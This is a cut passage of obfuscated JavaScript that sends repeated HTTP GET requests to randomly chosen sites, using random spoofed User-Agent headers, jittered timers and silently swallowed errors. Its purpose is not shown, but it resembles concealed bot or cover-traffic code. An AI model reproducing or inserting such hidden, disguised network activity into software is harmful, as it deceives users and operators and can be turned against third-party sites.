    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x147 * -0xd + 0x33 * 0xce + 0x2e9) * getRandomInt(0x1adc + 0x1ab4 + 0x1 * -0x358f, 0x1319 + -0xbb0 + -0x1d9 * 0x4));
}, 0x253c + 0x2 * -0x615 + -0x18ae);